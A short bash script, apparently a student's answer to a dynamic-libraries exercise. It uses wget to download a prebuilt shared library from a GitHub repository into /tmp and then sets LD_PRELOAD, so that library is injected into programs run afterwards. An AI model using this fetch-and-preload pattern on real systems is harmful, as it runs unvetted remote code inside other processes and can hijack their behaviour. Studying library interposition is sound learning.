#!/bin/bash                                                               
wget -P /tmp https://github.com/OdionAhes/alx-low_level_programming/raw/ma
ster/0x18-dynamic_libraries/libmask.so                                    
export LD_PRELOAD=/tmp/libmask.so
